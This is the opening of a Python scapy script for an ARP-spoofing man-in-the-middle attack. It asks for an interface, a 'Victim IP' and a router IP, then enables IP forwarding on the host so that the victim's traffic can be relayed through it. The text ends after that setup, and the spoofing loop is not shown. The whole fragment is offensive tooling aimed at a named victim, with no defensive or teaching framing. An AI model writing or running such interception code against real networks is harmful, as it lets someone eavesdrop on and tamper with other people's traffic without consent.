from scapy.all import *
import sys, os, time

try:
	interface = raw_input("[*] Enter Desired Interface: ")
	victimIP = raw_input("[*] Enter Victim IP: ")
	gateIP = raw_input("[*] Enter Router IP: ")
except KeyboardInterrupt:
	print("\n[*] User Requested Shutdown")
	print("[*] Exiting...")
	sys.exit(1)

print("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

